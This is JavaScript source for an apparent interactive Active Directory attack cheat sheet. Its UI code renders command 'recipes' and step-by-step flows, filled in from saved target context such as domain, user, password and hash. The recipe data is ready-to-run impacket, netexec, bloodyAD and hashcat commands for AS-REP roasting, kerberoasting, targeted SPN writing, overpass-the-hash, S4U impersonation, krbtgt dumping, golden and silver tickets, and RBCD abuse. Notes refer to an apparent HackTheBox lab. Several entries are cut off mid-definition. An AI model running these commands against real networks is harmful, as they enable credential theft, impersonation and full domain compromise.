  VAR_DEFS.forEach(v => { const i = ctxInputs[v.k]; if(i && v.req) i.classList.toggle('req-missing', !val(v.k)); });
  const rc = $('#reqCount');
  if(rc){
    rc.textContent = missing.length ? (missing.length + ' required missing') : 'all required set';
    rc.className = 'badge req' + (missing.length ? '' : ' ok');
    rc.title = missing.length ? 'click to jump to the missing required fields' : 'all required context is set';
  }
  updateSummary();
}

function focusContextFields(keys){
  $('#ctx').classList.remove('closed');
  const targets = [];
  keys.forEach(k => {
    const d = VAR_DEFS.find(v => v.k === k);
    if(!d) return;
    if(d.derive && d.src) d.src.forEach(s => targets.push(s));
    else targets.push(k);
  });
  const uniq = targets.filter((k, i) => targets.indexOf(k) === i);
  uniq.forEach(k => {
    const i = ctxInputs[k];
    if(!i) return;
    i.classList.remove('field-flash');
    void i.offsetWidth;
    i.classList.add('field-flash');
    setTimeout(() => i.classList.remove('field-flash'), 1600);
  });
  const first = ctxInputs[uniq[0]];
  if(first) first.scrollIntoView({behavior:'smooth', block:'center'});
}

function updateSummary(){
  const bits = [];
  if(val('domain')) bits.push(val('domain'));
  if(val('user')) bits.push(val('user') + (val('password') ? ':•••' : (val('nthash') ? ' #hash' : (val('ccache') ? ' #ccache' : ''))));
  if(val('target_host')) bits.push('→ ' + val('target_host'));
  $('#ctxSummary').textContent = bits.join('  ');
}

function recipeReadyCount(r){ return r.cmds.reduce((n, c) => n + (renderCommand(c).ready ? 1 : 0), 0); }
function recipeReady(r){ return r.cmds.some(c => renderCommand(c).ready); }

function recipeMatches(r){
  if(activeCat !== 'all' && r.cat !== activeCat) return false;
  if(UI.tiers && UI.tiers[r.pri || 2] === false) return false;
  if(UI.readyOnly && !recipeReady(r)) return false;
  if(!searchQ) return true;
  const hay = (r.title + ' ' + (r.desc || '') + ' ' + r.cmds.map(c => Array.isArray(c) ? c[0] + ' ' + (c[1] || '') : c).join(' ')).toLowerCase();
  return hay.indexOf(searchQ) >= 0;
}

function renderRecipes(){
  const list = $('#recipeList');
  list.innerHTML = '';
  const totalReady = RECIPES.filter(recipeReady).length;
  const counter = $('#readyCount');
  if(counter) counter.textContent = totalReady + '/' + RECIPES.length + ' ready';
  let found = RECIPES.filter(recipeMatches);
  if(UI.sort !== 'data'){
    found = found.map((r, i) => ({r, i, n:recipeReadyCount(r), t:r.cmds.length}));
    if(UI.sort === 'ready'){
      found.sort((a, b) => (b.n / b.t) - (a.n / a.t) || (b.r.pri - a.r.pri) || b.n - a.n || a.i - b.i);
    } else {
      found.sort((a, b) => (b.r.pri - a.r.pri) || (b.n / b.t) - (a.n / a.t) || b.n - a.n || a.i - b.i);
    }
    found = found.map(x => x.r);
  }
  if(!found.length){
    const p = document.createElement('p');
    p.className = 'dim';
    p.textContent = 'no recipes match.';
    list.appendChild(p);
    return;
  }
  found.forEach(r => list.appendChild(recipeCard(r)));
}

let activeFlow = null;

function flowProgress(f){
  const st = PROG[f.id] || {};
  let done = 0;
  f.steps.forEach((s, i) => { if(st[i]) done++; });
  return {done, total:f.steps.length};
}

function flowReady(f){
  if(!f.need && !f.needAny) return false;
  if((f.need || []).some(k => !val(k))) return false;
  if((f.needAny || []).length && !(f.needAny || []).some(k => val(k))) return false;
  return true;
}

function renderWizard(){

      .sort((a, b) => (b.f.pri - a.f.pri) || ((flowReady(b.f) ? 1 : 0) - (flowReady(a.f) ? 1 : 0)) || a.i - b.i)
      .map(x => x.f)

      const card = document.createElement('div');
      const ready = flowReady(f);
      card.className = 'flow' + (ready ? ' ready' : '');
      const top = document.createElement('div');

      const d = document.createElement('p'); d.textContent = f.when || '';
      const rq = document.createElement('p');
      if(f.reqs && f.reqs.length){ rq.className = 'flowreqs'; rq.textContent = 'requires: ' + f.reqs.join(' · '); }
      const meta = document.createElement('div');
      const pr = flowProgress(f);
      meta.className = 'meta';
      meta.innerHTML = '<span class="' + (pr.done === pr.total ? 'v-user' : 'dim') + '">' + pr.done + '/' + pr.total + ' steps</span>';

      grid.appendChild(card);
    });
    tab.appendChild(grid);
    return;
  }
  const f = FLOWS.find(x => x.id === activeFlow);
  if(!f){ activeFlow = null; return renderWizard(); }
  const back = document.createElement('button');
  back.className = 'back'; back.textContent = '← all flows';
  back.addEventListener('click', () => { activeFlow = null; renderWizard(); });
  tab.appendChild(back);

  const head = document.createElement('div');
  head.className = 'flowhead';
  const pr = flowProgress(f);

  const wp = document.createElement('p'); wp.textContent = f.when || '';
  const prereq = document.createElement('div');
  if(f.reqs && f.reqs.length){
    prereq.className = 'prereqbox';
    prereq.innerHTML = '<b>Requirements:</b> ' + f.reqs.map(esc).join(' · ');
  }
  const bar = document.createElement('div');
  bar.className = 'pbar'; bar.style.maxWidth = '280px';

  fill.style.width = (pr.total ? Math.round(pr.done / pr.total * 100) : 0) + '%';
  bar.appendChild(fill);
  head.appendChild(h2); head.appendChild(wp);
  if(prereq.className) head.appendChild(prereq);
  head.appendChild(bar);
  const actions = document.createElement('div');
  actions.style.margin = '10px 0 18px';
  const copyFlow = document.createElement('button');
  copyFlow.className = 'ghost';
  copyFlow.textContent = 'copy flow as markdown';
  copyFlow.addEventListener('click', () => copyText(flowMarkdown(f)));
  actions.appendChild(copyFlow);
  head.appendChild(actions);

  const st = PROG[f.id] || {};

    sh.className = 'step-head';

    cb.type = 'checkbox'; cb.checked = !!st[i];
    cb.title = 'mark step done';

      saveProg(); renderWizard();
    });
    const h3 = document.createElement('h3');

      p.className = 'stip'; p.innerHTML = renderNote(step.d);

    const grid = document.createElement('div');
    grid.className = 'grid';
    (step.r || []).forEach(id => {
      const r = RECIPES.find(x => x.id === id);
      if(r) grid.appendChild(recipeCard(r, true));
    });
    el.appendChild(grid);
    tab.appendChild(el);
  });
}

function mdNote(s){
  return String(s).replace(/<[^>]+>/g, '').replace(/\{\{(\w+)\}\}/g, (m, k) => {
    const d = VAR_DEFS.find(v => v.k === k);
    return val(k) || ('‹' + (d ? d.label : k) + '?›');
  });
}

function flowMarkdown(f){
  let out = '## ' + f.title + '\n\n' + (f.when || '') + '\n';
  f.steps.forEach((step, i) => {
    out += '\n### ' + (i + 1) + '. ' + step.t + '\n';
    if(step.d) out += '\n' + mdNote(step.d) + '\n';
    (step.r || []).forEach(id => {
      const r = RECIPES.find(x => x.id === id);
      if(!r) return;
      out += '\n**' + r.title + '**\n';
      r.cmds.forEach(c => { out += '\n```sh\n' + renderCommand(c).text + '\n```\n'; });
    });
  });
  return out;
}

  });
  $('#exampleBtn').addEventListener('click', () => {
    if(!confirm('Fill context with the argon.htb example values? Current values will be overwritten.')) return;
    S = Object.assign({}, DEFAULT_STATE, EXAMPLE_STATE);
    saveState(); syncContext(); renderActiveTab(); toast('example loaded');
  });
  $('#zshBtn').addEventListener('click', () => openModal('zsh completion — _hackerman', buildZshCompletion(), null, '_hackerman'));
  $('#proxyChk').addEventListener('change', e => {
    S.proxy = e.target.checked; saveState(); syncContext(); renderActiveTab();
  });
  $('#search').addEventListener('input', e => { searchQ = e.target.value.trim().toLowerCase(); renderRecipes(); });
  $('#readyOnlyChip').addEventListener('click', () => {
    UI.readyOnly = !UI.readyOnly; saveUI();
    $('#readyOnlyChip').classList.toggle('on', UI.readyOnly);
    renderRecipes();
  });
  $('#helpChip').classList.toggle('on', UI.help);
  document.body.classList.toggle('nohelp', !UI.help);
  $('#helpChip').addEventListener('click', () => {
    UI.help = !UI.help; saveUI();
    $('#helpChip').classList.toggle('on', UI.help);
    document.body.classList.toggle('nohelp', !UI.help);
    hideTip();
  });
  $('#compactChip').classList.toggle('on', UI.compact);
  $('#compactChip').addEventListener('click', () => {
    UI.compact = !UI.compact; saveUI();
    $('#compactChip').classList.toggle('on', UI.compact);
    renderActiveTab();
  });
  document.addEventListener('keydown', e => {
    if(e.key === '/' && !/INPUT|TEXTAREA|SELECT/.test(document.activeElement.tagName)){
      e.preventDefault(); $('#search').focus();
      if(activeTab !== 'recipes') $$('#tabs button').find(b => b.dataset.tab === 'recipes').click();
    }
    if((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k'){
      e.preventDefault();
      if(activeTab !== 'recipes') $$('#tabs button').find(b => b.dataset.tab === 'recipes').click();
      $('#search').focus();
    }
    if(e.key === 'Escape') closeModal();
  });

  $('#presetSave').addEventListener('click', () => {
    const name = prompt('Preset name:', S.domain || 'preset');
    if(!name) return;
    PRESETS[name] = JSON.parse(JSON.stringify(S));
    savePresets(); refreshPresets(); $('#presetSel').value = name; toast('preset saved');
  });
  $('#presetSel').addEventListener('change', e => {
    const n = e.target.value;
    if(!n || !PRESETS[n]) return;
    S = Object.assign({}, DEFAULT_STATE, PRESETS[n]);
    saveState(); syncContext(); renderActiveTab(); toast('preset loaded');
  });
  $('#presetDel').addEventListener('click', () => {
    const n = $('#presetSel').value;
    if(!n || !PRESETS[n]) return;
    if(confirm('Delete preset "' + n + '"?')){ delete PRESETS[n]; savePresets(); refreshPresets(); }
  });
  $('#resetBtn').addEventListener('click', () => {
    if(!confirm('Reset context (progress and presets stay)?')) return;
    S = Object.assign({}, DEFAULT_STATE);
    saveState(); syncContext(); renderActiveTab();
  });
  $('#expBtn').addEventListener('click', () => openModal('Export context (JSON)', JSON.stringify(S, null, 2)));
  $('#impBtn').addEventListener('click', () => openModal('Import context (paste JSON)', '', txt => {
    try {
      const o = JSON.parse(txt);
      if(typeof o !== 'object' || o === null) throw new Error('not an object');
      S = Object.assign({}, DEFAULT_STATE, o);
      saveState(); syncContext(); renderActiveTab(); closeModal(); toast('imported');
    } catch(e){ toast('invalid JSON'); }
  }));
  $('#modalClose').addEventListener('click', closeModal);
  $('#modalDownload').addEventListener('click', downloadModal);
  $('#modalCopy').addEventListener('click', () => copyText($('#modalText').value));
  $('#modalApply').addEventListener('click', () => { if(modalApply) modalApply($('#modalText').value); });
}

 [`python3 keytabextract.py {{keytab}}`,'extract NTLM + AES hashes','n'],
 [`impacket-getTGT '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -dc-ip {{dc_ip}}`,'get a TGT with the AES256 key'],
 [`export KRB5CCNAME={{user}}.ccache && klist`,'use the ticket']
],note:'Example output from your notes: <span class="mono">SERVICE PRINCIPAL : restrictedkrbhost/prod-dmz.argon.htb</span> → <span class="mono">NTLM HASH : c5f7…f95</span>, <span class="mono">AES-256 HASH : 2c76…dbc</span>. Prefer the <b>AES256 key</b> for Kerberos (RC4 is often disabled); NTLM hash is only useful for PtH/overpass on services that accept it.'});

R({id:'kerberos-auth',cat:'krb',title:'Kerberos auth from Kali — env & per-tool cheat sheet',desc:'Everything that must be in place before -k works, plus the exact invocation for each tool family.',
cmds:[
 [`# 1) /etc/krb5.conf — point Kerberos at the KDC (test with KRB5_CONFIG=./krb5.conf)`,'config','n'],
 [`[libdefaults]
    default_realm = {{realm}}
    dns_lookup_kdc = false
    dns_canonicalize_hostname = false
    rdns = false

[realms]
    {{realm}} = {
        kdc = {{dc_ip}}
    }

[domain_realm]
    .{{domain}} = {{realm}}
    {{domain}} = {{realm}}`,'krb5.conf content (copy)','n'],
 [`echo '{{dc_ip}}  {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts`,'2) name resolution — Kerberos needs hostnames, not IPs','ns'],
 [`date -u`,'3) clock skew must be < 5 min — compare with the DC','n'],
 [`sudo apt install -y faketime ntpsec-ntpdate`,'time helpers (once)','ns'],
 [`sudo ntpdate -u {{dc_ip}}`,'sync clock via NTP (package ntpsec-ntpdate)','ns'],
 [`sudo rdate -n {{dc_ip}}`,'or via SNTP (package rdate)','ns'],
 [`sudo chronyc makestep`,'or if chrony is your time daemon','ns'],
 [`sudo timedatectl set-ntp true`,'or let systemd handle it','ns'],
 [`faketime '+2 hours' impacket-getTGT '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'fake time for ONE command — KRB_AP_ERR_SKEW workaround when you cannot change the clock'],
 [`kinit '{{user}}@{{realm}}'`,'4) TGT with a password (prompts)'],
 [`kinit -V '{{user}}@{{realm}}'`,'verbose kinit — shows preauth/enctype errors','n'],
 [`kinit -k -t {{keytab}} '{{user}}$@{{realm}}'`,'TGT from a keytab (machine account, note the $)'],
 [`echo "KRB5CCNAME=\${KRB5CCNAME:-<unset>}"`,'5) which ccache is active?','n'],
 [`unset KRB5CCNAME`,'stale/expired ccache in the env? remove it — tools fall back to the default cache','n'],
 [`unset KRB5_CONFIG KRB5_TRACE`,'reset debug vars after troubleshooting','n'],
 [`export KRB5CCNAME={{ccache}}`,'point the shell at a ccache (kinit writes to the default cache — no export needed there)'],
 [`klist -A`,'all credential caches','n'],
 [`klist -c {{ccache}}`,'inspect one ccache without exporting','n'],
 [`klist -e`,'show tickets + encryption types','n'],
 [`kvno host/{{target_fqdn}}`,'6) test that a service ticket can be obtained'],
 [`kvno -e aes256-cts-hmac-sha1-96 host/{{target_fqdn}}`,'test a specific enctype for that SPN'],
 [`kdestroy`,'wipe the cache when done','n'],
 [`KRB5_TRACE=/dev/stderr klist`,'debug Kerberos (verbose trace)','n'],
 [`ls -la *.ccache`,'where tickets land: getTGT → <user>.ccache · getST → <user>@<spn>@REALM.ccache · ticketer → <user>.ccache'],
 [`impacket-ticketConverter ticket.kirbi ticket.ccache`,'Windows .kirbi → ccache (then export)','n'],
 [`# 7) per-tool invocation (KRB5CCNAME must point at your ccache):`,'cheat sheet','n'],
 [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket family: -k -no-pass (env inline)'],
 [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{user}}' -k --use-kcache --dns-server {{dc_ip}}`,'netexec: -k --use-kcache (env inline)'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'bloodyAD: -k ccache=FILE (no env needed)'],
 [`KRB5CCNAME={{ccache}} certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -stdout`,'certipy: -k -no-pass (env inline)'],
 [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}' --use-krb5-ccache={{ccache}} -S {{dc_host}}`,'samba net: --use-krb5-ccache=FILE']
],note:'Typical failures: <span class="mono">KRB_AP_ERR_SKEW</span> = clock — sync (<span class="mono">ntpdate/rdate/chrony</span>) or wrap a single command with <span class="mono">faketime</span>. <span class="mono">KDC_ERR_WRONG_REALM</span> = krb5.conf. <span class="mono">Server not found in Kerberos database</span> = missing /etc/hosts entry or wrong SPN (<span class="mono">kvno</span> verifies it). If <span class="mono">-k</span> is silently ignored, KRB5CCNAME is not set — check with <span class="mono">echo $KRB5CCNAME</span>; stale caches: <span class="mono">unset KRB5CCNAME</span> + <span class="mono">klist -A</span>. Kerberos always needs the FQDN; IPs break SPNs. <span class="mono">-no-pass</span> tells impacket not to prompt when using <span class="mono">-k</span>.'});

R({id:'asrep',cat:'krb',title:'AS-REP roasting',desc:'Accounts without Kerberos pre-authentication hand out crackable AS-REP hashes unauthenticated.',
cmds:[
 [`impacket-GetNPUsers '{{domain}}/' -usersfile users.txt -dc-ip {{dc_ip}} -request -format hashcat -outputfile {{hashfile}}`,'unauthenticated (userlist)'],
 [`impacket-GetNPUsers '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request -outputfile {{hashfile}}`,'with valid creds'],
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --asreproast {{hashfile}}`,'nxc module'],
 [`hashcat -m 18200 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n'],
 [`john --format=krb5asrep --wordlist={{wordlist}} {{hashfile}}`,'john alternative','n']
],note:'BloodHound query for candidates: <span class="mono">MATCH (u:User {dontreqpreauth:true}) RETURN u.name</span>. Output hashes start with <span class="mono">$krb5asrep$23$</span>.'});

R({id:'kerberoast',cat:'krb',title:'Kerberoasting (service accounts)',desc:'Request service tickets for accounts with SPNs and crack them offline.',
cmds:[
 [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request -outputfile {{hashfile}}`,'request all TGS hashes'],
 [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}'`,'single account'],

 [`KRB5CCNAME={{ccache}} nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache --kerberoasting {{hashfile}}`,'nxc via ccache'],
 [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n']
],note:'Anything with an SPN counts, including machine accounts and the krbtgt-adjacent service accounts. Hashes start with <span class="mono">$krb5tgs$23$</span>.'});

R({id:'targeted-kerberoast',cat:'krb',title:'Targeted kerberoast (write SPN on a user)',desc:'No roastable SPN? Give a user you can write to one, roast, clean up.',
cmds:[
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'set SPN'],
 [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'roast'],
 [`KRB5CCNAME={{ccache}} impacket-GetUserSPNs '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'roast via ccache'],
 [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'remove SPN']
],note:'Great against high-value accounts with weak passwords — no service disruption, fully reversible. Requires GenericWrite/WriteProperty on the SPN attribute.'});

R({id:'gettgt',cat:'krb',title:'getTGT — obtain tickets from secrets',desc:'Turn password / NT hash / AES key into a usable ccache (overpass-the-hash).',
cmds:[
 [`impacket-getTGT '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'password'],
 [`impacket-getTGT '{{domain}}/{{user}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}}`,'NT hash (overpass-the-hash)'],
 [`impacket-getTGT '{{domain}}/{{user}}' -aesKey '{{aeskey}}' -dc-ip {{dc_ip}}`,'AES256 key'],

R({id:'getst',cat:'krb',title:'getST — service ticket, impersonation & altservice',desc:'Request a service ticket as an arbitrary user (S4U2Self/S4U2Proxy). The workhorse for delegation attacks.',
cmds:[
 [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'with password'],
 [`impacket-getST '{{domain}}/{{user}}' -hashes ':{{nthash}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'with NT hash'],
 [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'machine account + AES key'],
 [`KRB5CCNAME={{ccache}} impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'via ccache (env inline)'],
 [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{target_fqdn}}' -dc-ip {{dc_ip}}`,'altservice trick'],
 [`export KRB5CCNAME=$(pwd)/'{{target_user}}@{{spn}}@{{realm}}.ccache' && klist`,'use returned ticket']
],note:'<b>altservice</b>: if the target has no SPN for the service you need, request one it does have (usually <span class="mono">HOST/target</span>) and rewrite the service class in the ticket — your notes used this for <span class="mono">MSSQLSvc/PROD-SQL</span> → <span class="mono">HOST/PROD-DC</span>. Always <span class="mono">ls *.ccache</span> — newer impacket names the file with the full SPN (slashes become underscores).'});

R({id:'ccache-usage',cat:'krb',title:'Working with ccache files',desc:'Naming, env var, conversion and validation.',
cmds:[
 [`export KRB5CCNAME={{ccache}}`,'set ticket for all tools'],
 [`klist`,'show principals + expiry','n'],

 [`KRB5CCNAME={{ccache}} nxc smb {{target_host}} -u '{{user}}' -k --use-kcache --sam --lsa`,'use ccache for dumping'],

R({id:'golden-ticket',cat:'krb',title:'Golden ticket (krbtgt)',desc:'Full domain persistence: forge a TGT with the krbtgt hash.',
cmds:[

 [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass -just-dc-user krbtgt '{{domain}}/{{user}}@{{dc_fqdn}}'`,'extract krbtgt via ccache'],

R({id:'silver-ticket',cat:'krb',title:'Silver ticket (service hash)',desc:'Forge a TGS for one service when you have that machine/service account hash.',
cmds:[

R({id:'ticket-inspect',cat:'krb',title:'Inspect & renew Kerberos tickets',desc:'Decode a ccache, check service names/enctypes, and renew a TGT before it expires.',
cmds:[

R({id:'deleg-enum',cat:'deleg',title:'Enumerate delegation settings',desc:'Find constrained, unconstrained and RBCD configuration before abusing it.',

R({id:'rbcd-read',cat:'deleg',title:'RBCD step 1 — read current delegation state',desc:'See who (if anyone) is already allowed to act on behalf of the target computer.',

R({id:'rbcd-addcomputer',cat:'deleg',title:'RBCD step 2 — add a rogue machine account',desc:'You need a computer account you control (its SID will be the delegate). Default quota (MachineAccountQuota ≥ 1) usually allows this for any user.',

R({id:'rbcd-write',cat:'deleg',title:'RBCD step 3 — grant delegation from rogue machine',desc:'Point the target computer at your rogue machine account.',
